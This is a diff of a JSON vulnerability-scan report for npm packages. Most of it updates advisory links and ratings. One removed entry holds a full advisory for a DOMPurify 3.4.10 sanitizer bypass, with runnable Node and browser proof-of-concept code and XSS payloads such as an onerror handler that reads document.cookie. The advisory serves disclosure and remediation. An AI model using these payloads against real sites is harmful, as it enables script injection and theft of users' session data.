-          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/2WUSPYOTOMAZPDEFPWPSCSPMNODRDKK3/"
-        },
-        {
-          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/7LNAKCNTVBIHWAUT3FKWV5N67PQXSZOO"
-        },
-        {
-          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/7LNAKCNTVBIHWAUT3FKWV5N67PQXSZOO/"
-        },
-        {
           "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/2WUSPYOTOMAZPDEFPWPSCSPMNODRDKK3"
         },
         {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/2WUSPYOTOMAZPDEFPWPSCSPMNODRDKK3/"
+        },
+        {
           "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7LNAKCNTVBIHWAUT3FKWV5N67PQXSZOO"
+        },
+        {
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7LNAKCNTVBIHWAUT3FKWV5N67PQXSZOO/"
         },
         {
           "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25844"
@@ -30702,7 +30755,7 @@
       "cwes": [
         1333
       ],
-      "description": "This affects versions of the package angular from 1.3.0. A regular expression used to split the value of the ng-srcset directive is vulnerable to super-linear runtime due to backtracking. With large carefully-crafted input, this can result in catastrophic backtracking and cause a denial of service. \r\r\r**Note:**\r\rThis package is EOL and will not receive any updates to address this issue. Users should migrate to [@angular/core](https://www.npmjs.com/package/@angular/core).",
+      "description": "This affects versions of the package angular from 1.3.0; versions of the package angularjs from 1.3.0. A regular expression used to split the value of the ng-srcset directive is vulnerable to super-linear runtime due to backtracking. With large carefully-crafted input, this can result in catastrophic backtracking and cause a denial of service. \r\r\r**Note:**\r\rThis package is EOL and will not receive any updates to address this issue. Users should migrate to [@angular/core](https://www.npmjs.com/package/@angular/core).",
       "advisories": [
         {
           "url": "https://avd.aquasec.com/nvd/cve-2024-21490"
@@ -30718,6 +30771,9 @@
         },
         {
           "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21490"
+        },
+        {
+          "url": "https://security.snyk.io/vuln/SNYK-DOTNET-ANGULARJS-10771616"
         },
         {
           "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-6241746"
@@ -30742,7 +30798,7 @@
         }
       ],
       "published": "2024-02-10T05:15:08Z",
-      "updated": "2026-06-17T07:09:36Z",
+      "updated": "2026-06-29T16:16:33Z",
       "affects": [
         {
           "ref": "pkg:npm/angular@1.8.3",
@@ -31218,6 +31274,15 @@
           "severity": "high",
           "method": "CVSSv4",
           "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 7.5,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
         }
       ],
       "cwes": [
@@ -31228,6 +31293,30 @@
       "advisories": [
         {
           "url": "https://avd.aquasec.com/nvd/cve-2026-12143"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:33155"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:33160"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:33163"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:33173"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:33183"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:34342"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2026-12143"
+        },
+        {
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2488480"
         },
         {
           "url": "https://cwe.mitre.org/data/definitions/93.html"
@@ -31254,11 +31343,17 @@
           "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12143"
         },
         {
+          "url": "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-12143.json"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-12143"
+        },
+        {
           "url": "https://www.npmjs.com/package/form-data"
         }
       ],
       "published": "2026-06-12T19:16:26Z",
-      "updated": "2026-06-17T10:14:38Z",
+      "updated": "2026-07-02T12:16:54Z",
       "affects": [
         {
           "ref": "pkg:npm/form-data@4.0.5",
@@ -31404,50 +31499,6 @@
           "versions": [
             {
               "version": "6.14.1",
-              "status": "affected"
-            }
-          ]
-        }
-      ]
-    },
-    {
-      "id": "GHSA-cmwh-pvxp-8882",
-      "source": {
-        "name": "ghsa",
-        "url": "https://github.com/advisories?query=type%3Areviewed\u002Becosystem%3Anpm"
-      },
-      "ratings": [
-        {
-          "source": {
-            "name": "ghsa"
-          },
-          "score": 5.1,
-          "severity": "medium",
-          "method": "CVSSv4",
-          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N"
-        }
-      ],
-      "description": "## Summary\n\nDOMPurify 3.4.7 shipped a security fix (\u0022permanent hook pollution\u0022) that makes a registered \u0060uponSanitizeAttribute\u0060 hook\u0027s mutation of \u0060data.allowedAttributes\u0060 **non-persistent** \u2014 so allowing an attribute for one element does not leak into later \u0060sanitize()\u0060 calls. The fix clones \u0060ALLOWED_ATTR\u0060 inside \u0060_parseConfig\u0060.\n\nThat guard is **silently bypassed whenever the application uses the persistent-config API \u0060DOMPurify.setConfig()\u0060.** \u0060setConfig()\u0060 sets the module flag \u0060SET_CONFIG = true\u0060, which causes \u0060sanitize()\u0060 to **skip \u0060_parseConfig\u0060 entirely** \u2014 and the clone-guard lives inside \u0060_parseConfig\u0060. The hook is then handed the **live, shared \u0060ALLOWED_ATTR\u0060 object**; any \u0060data.allowedAttributes[name] = true\u0060 it writes mutates that shared object **permanently**, for the lifetime of the DOMPurify instance, across every subsequent call, and across **all** elements.\n\nIf an application uses \u0060setConfig()\u0060 together with an \u0060uponSanitizeAttribute\u0060 hook that conditionally allows a dangerous attribute (\u0060onerror\u0060, \u0060onclick\u0060, \u0060onmouseover\u0060, \u0060srcdoc\u0060, \u0060formaction\u0060, \u2026) for \u0022trusted\u0022 elements, then **one trusted render permanently allows that attribute on untrusted, attacker-controlled content** \u2014 yielding stored XSS in viewers\u0027 browsers. DOMPurify applies no separate \u0060/^on/\u0060 event-handler blocklist: attribute stripping is governed entirely by the allowlist, so a polluted allowlist is the only gate, and survival in the output is final.\n\n---\n\n## Affected configuration (preconditions)\n\nThe vulnerability is triggered when an application does **both**:\n\n1. Calls \u0060DOMPurify.setConfig(...)\u0060 once (the recommended pattern for a fixed, persistent policy), **and**\n2. Registers an \u0060uponSanitizeAttribute\u0060 hook that writes \u0060data.allowedAttributes[name] = true\u0060 to conditionally allow an attribute (e.g. only for elements bearing a trust marker).\n\nThis hook pattern is demonstrated in DOMPurify\u0027s own test suite, and the per-call variant of exactly this leak is what 3.4.7 was released to fix.\n\n---\n\n## Root cause (source: \u0060src/purify.ts\u0060, v3.4.10)\n\nThe 3.4.7 clone-guard \u2014 only inside \u0060_parseConfig\u0060:\n\n\u0060\u0060\u0060\n// src/purify.ts  _parseConfig()  (lines ~950-968)\n// \u0022if a hook is registered AND the set still points at the default constant, clone it.\n//  The hook then mutates the clone ... and the next default-cfg call rebinds to the untouched original.\u0022\nif ( ... \u0026\u0026 hooks.uponSanitizeAttribute.length \u003E 0) {\n  ALLOWED_TAGS = clone(ALLOWED_TAGS);          // line 961\n}\nif ( ... hooks.uponSanitizeAttribute.length \u003E 0 ... ) {\n  ALLOWED_ATTR = clone(ALLOWED_ATTR);          // line 968\n}\n\u0060\u0060\u0060\n\n\u0060sanitize()\u0060 skips \u0060_parseConfig\u0060 on the persistent-config path:\n\n\u0060\u0060\u0060\n// src/purify.ts  DOMPurify.sanitize()  (line 2369)\nif (!SET_CONFIG) {\n  _parseConfig(cfg);          // \u003C-- clone-guard lives in here; SKIPPED when SET_CONFIG is true\n}\n\u0060\u0060\u0060\n\n\u0060setConfig()\u0060 sets the flag that disables the guard:\n\n\u0060\u0060\u0060\n// src/purify.ts  (lines 2596-2598)\nDOMPurify.setConfig = function (cfg = {}) {\n  _parseConfig(cfg);\n  SET_CONFIG = true;          // every later sanitize() now skips _parseConfig\n};\n\u0060\u0060\u0060\n\nThe hook is handed the **live** allowlist binding, and there is no secondary event-handler defense:\n\n\u0060\u0060\u0060\n// src/purify.ts (line 2088) \u2014 hook event exposes the shared object by reference\nallowedAttributes: ALLOWED_ATTR,\n// (line 2108) hooks.uponSanitizeAttribute executed; a write to data.allowedAttributes mutates ALLOWED_ATTR itself\n// _isValidAttribute gates purely on ALLOWED_ATTR[lcName]; DOMPurify uses NO /^on/ blocklist by design.\n\u0060\u0060\u0060\n\n**Net:** after \u0060setConfig()\u0060, the clone-guard never runs, so the hook\u0027s \u0060allowedAttributes\u0060 mutation is a permanent write to the instance\u0027s shared \u0060ALLOWED_ATTR\u0060.\n\n---\n\n## Proof of Concept\n\nEnvironment: \u0060npm i dompurify@3.4.10 jsdom\u0060 (Node; identical mechanism to \u0060isomorphic-dompurify\u0060, and to a browser instance).\n\n### PoC 1 \u2014 the leak (trusted render permanently allows \u0060onerror\u0060 on attacker content)\n\n\u0060\u0060\u0060js\nconst createDOMPurify = require(\u0027dompurify\u0027);\nconst { JSDOM } = require(\u0027jsdom\u0027);\nconst DP = createDOMPurify(new JSDOM(\u0027\u0027).window);\n\n// App init: persistent policy \u002B a hook that allows onerror ONLY for trusted, pre-vetted elements\nDP.setConfig({ ALLOWED_TAGS: [\u0027img\u0027], ALLOWED_ATTR: [\u0027src\u0027] });\nDP.addHook(\u0027uponSanitizeAttribute\u0027, (node, data) =\u003E {\n  if (node.getAttribute \u0026\u0026 node.getAttribute(\u0027data-trusted\u0027) === \u00271\u0027) {\n    data.allowedAttributes[\u0027onerror\u0027] = true;        // intended: trusted-only\n  }\n});\n\n// 1) A trusted widget is rendered once\nDP.sanitize(\u0027\u003Cimg data-trusted=\u00221\u0022 src=\u0022x\u0022 onerror=\u0022loadWidget()\u0022\u003E\u0027);\n\n// 2) Later, ATTACKER-controlled content (NO data-trusted) is sanitized on the same instance\nconsole.log(DP.sanitize(\u0027\u003Cimg src=\u0022x\u0022 onerror=\u0022alert(document.cookie)\u0022\u003E\u0027));\n// OUTPUT:  \u003Cimg src=\u0022x\u0022 onerror=\u0022alert(document.cookie)\u0022\u003E     \u003C-- onerror SURVIVES -\u003E XSS\n\u0060\u0060\u0060\n\n### PoC 2 \u2014 it is a DOMPurify state-leak, not \u0022the app allowed \u0060on*\u0060\u0022 (attribute-agnostic)\n\n\u0060\u0060\u0060js\n// Same setConfig \u002B hook shape, but the hook allows a BENIGN attribute (title).\n// The leak is identical -\u003E the defect is a shared-state mutation in DOMPurify,\n// independent of which attribute the hook touches.\nDP.setConfig({ ALLOWED_TAGS: [\u0027span\u0027], ALLOWED_ATTR: [] });\nDP.addHook(\u0027uponSanitizeAttribute\u0027, (n, d) =\u003E {\n  if (n.getAttribute \u0026\u0026 n.getAttribute(\u0027data-trusted\u0027) === \u00271\u0027) d.allowedAttributes[\u0027title\u0027] = true;\n});\nDP.sanitize(\u0027\u003Cspan data-trusted=\u00221\u0022 title=\u0022ok\u0022\u003Ex\u003C/span\u003E\u0027);\nconsole.log(DP.sanitize(\u0027\u003Cspan title=\u0022leaked\u0022\u003Ex\u003C/span\u003E\u0027));   // -\u003E \u003Cspan title=\u0022leaked\u0022\u003Ex\u003C/span\u003E  (leaked)\n\u0060\u0060\u0060\n\n### PoC 3 \u2014 control: WITHOUT \u0060setConfig()\u0060 the 3.4.7 guard holds\n\n\u0060\u0060\u0060js\nconst DP2 = createDOMPurify(new JSDOM(\u0027\u0027).window);\nDP2.addHook(\u0027uponSanitizeAttribute\u0027, (n, d) =\u003E {\n  if (n.getAttribute \u0026\u0026 n.getAttribute(\u0027data-trusted\u0027) === \u00271\u0027) d.allowedAttributes[\u0027onerror\u0027] = true;\n});\nDP2.sanitize(\u0027\u003Cimg data-trusted=\u00221\u0022 src=\u0022x\u0022 onerror=\u0022ok()\u0022\u003E\u0027, { ALLOWED_TAGS: [\u0027img\u0027], ALLOWED_ATTR: [\u0027src\u0027] });\nconsole.log(DP2.sanitize(\u0027\u003Cimg src=\u0022x\u0022 onerror=\u0022alert(1)\u0022\u003E\u0027, { ALLOWED_TAGS: [\u0027img\u0027], ALLOWED_ATTR: [\u0027src\u0027] }));\n// OUTPUT:  \u003Cimg src=\u0022x\u0022\u003E     \u003C-- onerror correctly STRIPPED. setConfig() is the trigger.\n\u0060\u0060\u0060\n\n### Persistence (observed)\n\n- The leak **persists after \u0060removeAllHooks()\u0060** \u2014 removing the hook does not clean the polluted allowlist.\n- It is **global / cross-element** \u2014 a polluted \u0060onmouseover\u0060 survives on \u0060\u003Ca\u003E\u0060 and \u0060\u003Cdiv\u003E\u0060, not only the originally-blessed \u0060\u003Cimg\u003E\u0060.\n- It persists for the **instance lifetime** (survived 5/5 subsequent default calls).\n- \u0060clearConfig()\u0060 **does** restore a clean state (this is the bound of the impact).\n\n---\n\n## Impact\n\nStored XSS. In a long-lived (e.g. server-side / \u0060isomorphic-dompurify\u0060) DOMPurify instance, a single trusted render flips a shared allowlist bit; every subsequent untrusted submission then inherits a live event-handler attribute and executes script in viewers\u0027 browsers. Because DOMPurify enforces no \u0060/^on/\u0060 blocklist, a surviving \u0060on*\u0060 attribute is final \u2014 no secondary control prevents execution. \u0060onerror\u0060 on a broken-\u0060src\u0060 \u0060\u003Cimg\u003E\u0060 fires with no user interaction (browser-confirmed; see Validation).\n\n**Per-call \u0060FORBID_ATTR\u0060 does not mitigate.** A defensive \u0060sanitize(input, { FORBID_ATTR: [\u0027onerror\u0027] })\u0060 is also ignored once \u0060setConfig()\u0060 has been called: the per-call config is parsed by \u0060_parseConfig\u0060, which \u0060sanitize()\u0060 skips entirely under \u0060SET_CONFIG\u0060. So an application cannot blunt the leak with a per-call denylist \u2014 the poisoned \u0060ALLOWED_ATTR\u0060 is the sole gate.\n\n---\n\n## Realistic attack scenario\n\nA platform mixes admin-authored interactive widgets with user-generated content through one sanitizer instance:\n\n1. The app installs a persistent baseline policy via \u0060setConfig({ ALLOWED_TAGS: [...], ALLOWED_ATTR: [...] })\u0060.\n2. It registers an \u0060uponSanitizeAttribute\u0060 hook that enables an event handler **only** for admin-vetted elements marked \u0060data-trusted=\u00221\u0022\u0060, intending safe rich interactivity \u2014 a pattern the 3.4.7 fix was specifically meant to make safe.\n3. An admin renders one trusted widget. From that point on, every user-submitted comment/post containing \u0060\u003Cimg src=x onerror=...\u003E\u0060 passes sanitization and executes for all viewers.\n\n---\n\n## Remediation\n\nExtend the existing clone-guard to the persistent-config (\u0060SET_CONFIG\u0060) fast-path: when \u0060sanitize()\u0060 skips \u0060_parseConfig\u0060 but an \u0060uponSanitizeAttribute\u0060 hook is registered, clone the allowlists before the walk so hook mutations cannot persist \u2014 the exact analogue of the guard already present in \u0060_parseConfig\u0060.\n\n\u0060\u0060\u0060js\n// In DOMPurify.sanitize(), replacing the bare \u0060if (!SET_CONFIG) { _parseConfig(cfg); }\u0060:\nif (!SET_CONFIG) {\n  _parseConfig(cfg);\n} else if (hooks.uponSanitizeAttribute.length \u003E 0) {\n  // Persistent-config path: _parseConfig (and its clone-guard) is skipped, so a hook would\n  // otherwise mutate the shared ALLOWED_ATTR/ALLOWED_TAGS permanently. Clone per call.\n  if (ALLOWED_ATTR === DEFAULT_ALLOWED_ATTR || ALLOWED_ATTR === currentSetConfigAttr) {\n    ALLOWED_ATTR = clone(ALLOWED_ATTR);\n  }\n  if (ALLOWED_TAGS === DEFAULT_ALLOWED_TAGS || ALLOWED_TAGS === currentSetConfigTags) {\n    ALLOWED_TAGS = clone(ALLOWED_TAGS);\n  }\n}\n\u0060\u0060\u0060\n\n(Equivalently: in the hook-event builder at line ~2088, hand the hook a shallow clone of \u0060ALLOWED_ATTR\u0060/\u0060ALLOWED_TAGS\u0060 whenever \u0060SET_CONFIG\u0060 is true, mirroring the 3.4.7 intent.)\n\nA regression test should reproduce PoC 1 and assert the attacker call returns \u0060\u003Cimg src=\u0022x\u0022\u003E\u0060. Note the existing 3.4.7 regression test (\u0022unguarded attribute hook does not poison subsequent default-config calls\u0022) never exercises \u0060setConfig()\u0060 \u2014 adding a \u0060setConfig\u0060 variant closes the gap.\n\n**Application-side mitigation until patched:** prefer \u0060data.keepAttr = true\u0060 (per-element, non-persistent) over \u0060data.allowedAttributes[name] = true\u0060 inside hooks; or call \u0060DOMPurify.clearConfig()\u0060 between trust domains; or use separate DOMPurify instances for trusted vs. untrusted content.\n\n---\n\n## Limitations\n\n- Requires the two-part precondition above (persistent \u0060setConfig()\u0060 **and** a hook writing \u0060data.allowedAttributes[...]\u0060). Not a default-config bypass.\n- Impact is bounded by \u0060clearConfig()\u0060, which restores a clean state. The earlier-considered \u0022survives \u0060clearConfig()\u0060\u0022 claim did **not** reproduce and is withdrawn.\n- A position could be adopted to \u0022use \u0060data.keepAttr=true\u0060, not \u0060allowedAttributes[]\u0060.\u0022 However, the 3.4.7 security fix exists precisely to defend the \u0060allowedAttributes[]\u0060 hook pattern in the per-call path; leaving the \u0060setConfig\u0060 path unguarded is an incomplete fix of an acknowledged security issue.\n\n## Validation\n\n- **Integrity:** the tested \u0060dompurify@3.4.10\u0060 \u0060dist/purify.cjs.js\u0060 (md5 \u0060ab0e7b1cde1cbcace0f62b6aac284143\u0060) and browser \u0060dist/purify.min.js\u0060 (md5 \u0060b0985f80fa48e6e7b263f8f6a64b779e\u0060) are byte-identical to a freshly \u0060npm pack\u0060-ed release \u2014 the repro is on the real shipped code. Mechanism identical on 3.4.0, 3.4.9 and 3.4.10.\n- **Node (mechanism):** PoCs 1\u20133 reproduce deterministically; \u0060DOMPurify.isValidAttribute(\u0027img\u0027,\u0027onerror\u0027,\u0027x\u0027)\u0060 flips \u0060false \u2192 true\u0060 after a single trusted render under \u0060setConfig()\u0060, proving the shared attribute gate is poisoned. Leak survives \u0060removeAllHooks()\u0060, is cross-element, persists for the instance lifetime, and is reset only by \u0060clearConfig()\u0060.\n- **Real browser (impact):** in Chrome with DOMPurify 3.4.10, assigning the attacker output to \u0060innerHTML\u0060 **executes** the surviving \u0060onerror\u0060 (sentinel \u0060window.__fired = [\u0022ATTACKER-onerror\u0022]\u0060; \u0060onerror\u0060 DOM property is a \u0060function\u0060), with no user interaction. The no-\u0060setConfig\u0060 A/B control does not fire \u2014 execution is attributable to the \u0060setConfig\u0060 leak, not a harness artifact.\n\n---\n\n## Appendix A \u2014 Node PoC (complete, runnable)\n\n\u0060\u0060\u0060js\n// poc.js  \u2014  npm i dompurify@3.4.10 jsdom  \u0026\u0026  node poc.js\nconst createDOMPurify = require(\u0027dompurify\u0027);\nconst { JSDOM } = require(\u0027jsdom\u0027);\nconst freshDP = () =\u003E createDOMPurify(new JSDOM(\u0027\u0027).window);\nconst log = (s) =\u003E console.log(s);\nlog(\u0027DOMPurify \u0027 \u002B freshDP().version \u002B \u0027\\n\u0027);\n\n// PoC 1 \u2014 the leak: trusted render permanently allows onerror on attacker content\n{\n  const DP = freshDP();\n  DP.setConfig({ ALLOWED_TAGS: [\u0027img\u0027], ALLOWED_ATTR: [\u0027src\u0027] });\n  DP.addHook(\u0027uponSanitizeAttribute\u0027, (node, data) =\u003E {\n    if (node.getAttribute \u0026\u0026 node.getAttribute(\u0027data-trusted\u0027) === \u00271\u0027) {\n      data.allowedAttributes[\u0027onerror\u0027] = true;            // intended: trusted-only\n    }\n  });\n  DP.sanitize(\u0027\u003Cimg data-trusted=\u00221\u0022 src=\u0022x\u0022 onerror=\u0022loadWidget()\u0022\u003E\u0027);            // trusted render\n  const attacker = DP.sanitize(\u0027\u003Cimg src=\u0022x\u0022 onerror=\u0022alert(document.cookie)\u0022\u003E\u0027);  // attacker, no data-trusted\n  log(\u0027[PoC1] attacker output  : \u0027 \u002B attacker);\n  log(\u0027[PoC1] onerror survived : \u0027 \u002B /onerror/.test(attacker));\n  log(\u0027[PoC1] isValidAttribute(img,onerror) -\u003E \u0027 \u002B DP.isValidAttribute(\u0027img\u0027,\u0027onerror\u0027,\u0027x\u0027) \u002B \u0027  (shared gate poisoned)\\n\u0027);\n}\n\n// PoC 2 \u2014 attribute-agnostic: a DOMPurify state-leak, not \u0022the app allowed on*\u0022\n{\n  const DP = freshDP();\n  DP.setConfig({ ALLOWED_TAGS: [\u0027span\u0027], ALLOWED_ATTR: [] });\n  DP.addHook(\u0027uponSanitizeAttribute\u0027, (n, d) =\u003E {\n    if (n.getAttribute \u0026\u0026 n.getAttribute(\u0027data-trusted\u0027) === \u00271\u0027) d.allowedAttributes[\u0027title\u0027] = true;\n  });\n  DP.sanitize(\u0027\u003Cspan data-trusted=\u00221\u0022 title=\u0022ok\u0022\u003Ex\u003C/span\u003E\u0027);\n  log(\u0027[PoC2] benign title leaks: \u0027 \u002B DP.sanitize(\u0027\u003Cspan title=\u0022leaked\u0022\u003Ex\u003C/span\u003E\u0027) \u002B \u0027\\n\u0027);\n}\n\n// PoC 3 \u2014 control: WITHOUT setConfig the 3.4.7 guard holds\n{\n  const DP = freshDP();\n  DP.addHook(\u0027uponSanitizeAttribute\u0027, (n, d) =\u003E {\n    if (n.getAttribute \u0026\u0026 n.getAttribute(\u0027data-trusted\u0027) === \u00271\u0027) d.allowedAttributes[\u0027onerror\u0027] = true;\n  });\n  DP.sanitize(\u0027\u003Cimg data-trusted=\u00221\u0022 src=\u0022x\u0022 onerror=\u0022ok()\u0022\u003E\u0027, { ALLOWED_TAGS:[\u0027img\u0027], ALLOWED_ATTR:[\u0027src\u0027] });\n  const ctrl = DP.sanitize(\u0027\u003Cimg src=\u0022x\u0022 onerror=\u0022alert(1)\u0022\u003E\u0027, { ALLOWED_TAGS:[\u0027img\u0027], ALLOWED_ATTR:[\u0027src\u0027] });\n  log(\u0027[PoC3] control output   : \u0027 \u002B ctrl \u002B \u0027   stripped: \u0027 \u002B !/onerror/.test(ctrl) \u002B \u0027\\n\u0027);\n}\n\n// Persistence: survives removeAllHooks(); reset only by clearConfig()\n{\n  const DP = freshDP();\n  DP.setConfig({ ALLOWED_TAGS: [\u0027img\u0027], ALLOWED_ATTR: [\u0027src\u0027] });\n  DP.addHook(\u0027uponSanitizeAttribute\u0027, (n, d) =\u003E {\n    if (n.getAttribute \u0026\u0026 n.getAttribute(\u0027data-trusted\u0027) === \u00271\u0027) d.allowedAttributes[\u0027onerror\u0027] = true;\n  });\n  DP.sanitize(\u0027\u003Cimg data-trusted=\u00221\u0022 src=\u0022x\u0022 onerror=\u0022ok()\u0022\u003E\u0027);\n  DP.removeAllHooks();\n  let leaks = 0;\n  for (let i = 0; i \u003C 5; i\u002B\u002B) if (/onerror/.test(DP.sanitize(\u0027\u003Cimg src=\u0022x\u0022 onerror=\u0022alert(\u0027\u002Bi\u002B\u0027)\u0022\u003E\u0027))) leaks\u002B\u002B;\n  log(\u0027[persist] survived \u0027 \u002B leaks \u002B \u0027/5 calls after removeAllHooks()\u0027);\n  DP.clearConfig();\n  log(\u0027[persist] after clearConfig(): \u0027 \u002B DP.sanitize(\u0027\u003Cimg src=\u0022x\u0022 onerror=\u0022alert(1)\u0022\u003E\u0027) \u002B \u0027  (reset)\u0027);\n}\n\u0060\u0060\u0060\n\nExpected output:\n\u0060\u0060\u0060\n[PoC1] attacker output  : \u003Cimg src=\u0022x\u0022 onerror=\u0022alert(document.cookie)\u0022\u003E\n[PoC1] onerror survived : true\n[PoC1] isValidAttribute(img,onerror) -\u003E true  (shared gate poisoned)\n[PoC2] benign title leaks: \u003Cspan title=\u0022leaked\u0022\u003Ex\u003C/span\u003E\n[PoC3] control output   : \u003Cimg src=\u0022x\u0022\u003E   stripped: true\n[persist] survived 5/5 calls after removeAllHooks()\n[persist] after clearConfig(): \u003Cimg src=\u0022x\u0022\u003E  (reset)\n\u0060\u0060\u0060\n\n## Appendix B \u2014 Browser PoC (complete; confirms execution)\n\n\u0060\u0060\u0060html\n\u003C!doctype html\u003E\u003Chtml\u003E\u003Chead\u003E\u003Cmeta charset=\u0022utf-8\u0022\u003E\n\u003Cscript src=\u0022https://cdn.jsdelivr.net/npm/dompurify@3.4.10/dist/purify.min.js\u0022\u003E\u003C/script\u003E\n\u003C/head\u003E\u003Cbody\u003E\u003Cpre id=\u0022out\u0022\u003E\u003C/pre\u003E\n\u003Cscript\u003E\nconst log = (s) =\u003E document.getElementById(\u0027out\u0027).textContent \u002B= s \u002B \u0027\\n\u0027;\nwindow.__fired = [];\nwindow.alert = (x) =\u003E window.__fired.push(\u0027alert:\u0027 \u002B x);   // sentinel: capture exec, no modal\nlog(\u0027DOMPurify \u0027 \u002B DOMPurify.version);\n\n// App init: persistent policy \u002B a hook allowing onerror ONLY for trusted elements\nDOMPurify.setConfig({ ALLOWED_TAGS: [\u0027img\u0027], ALLOWED_ATTR: [\u0027src\u0027] });\nDOMPurify.addHook(\u0027uponSanitizeAttribute\u0027, (node, data) =\u003E {\n  if (node.getAttribute \u0026\u0026 node.getAttribute(\u0027data-trusted\u0027) === \u00271\u0027) data.allowedAttributes[\u0027onerror\u0027] = true;\n});\n\nDOMPurify.sanitize(\u0027\u003Cimg data-trusted=\u00221\u0022 src=\u0022x\u0022 onerror=\u00220\u0022\u003E\u0027);                 // one trusted render\nconst out = DOMPurify.sanitize(\u0027\u003Cimg src=\u0022x\u0022 onerror=\u0022alert(\\\u0027XSS:\\\u0027\u002Bdocument.domain)\u0022\u003E\u0027);  // attacker\nlog(\u0027attacker sanitized output: \u0027 \u002B out);\nconst host = document.createElement(\u0027div\u0027);\nhost.innerHTML = out;                            // surviving onerror arms on the broken-src img\ndocument.body.appendChild(host);\n\nsetTimeout(() =\u003E {\n  log(\u0027handlers fired: \u0027 \u002B JSON.stringify(window.__fired));\n  log(window.__fired.length ? \u0027RESULT: XSS EXECUTED\u0027 : \u0027RESULT: no execution\u0027);\n}, 500);\n\u003C/script\u003E\u003C/body\u003E\u003C/html\u003E\n\u0060\u0060\u0060\n\nObserved: \u0060handlers fired: [\u0022alert:XSS:\u003Cdomain\u003E\u0022]\u0060 \u2192 **RESULT: XSS EXECUTED** (no user interaction). The same harness without the \u0060setConfig()\u0060 line strips \u0060onerror\u0060 and does not fire.",
-      "recommendation": "Upgrade dompurify to version 3.4.11",
-      "advisories": [
-        {
-          "url": "https://github.com/advisories/GHSA-cmwh-pvxp-8882"
-        },
-        {
-          "url": "https://github.com/cure53/DOMPurify"
-        },
-        {
-          "url": "https://github.com/cure53/DOMPurify/security/advisories/GHSA-cmwh-pvxp-8882"
-        }
-      ],
-      "published": "2026-06-18T14:27:37Z",
-      "updated": "2026-06-18T14:27:37Z",
-      "affects": [
-        {
-          "ref": "pkg:npm/dompurify@3.4.10",
-          "versions": [
-            {
-              "version": "3.4.10",
               "status": "affected"
             }
           ]
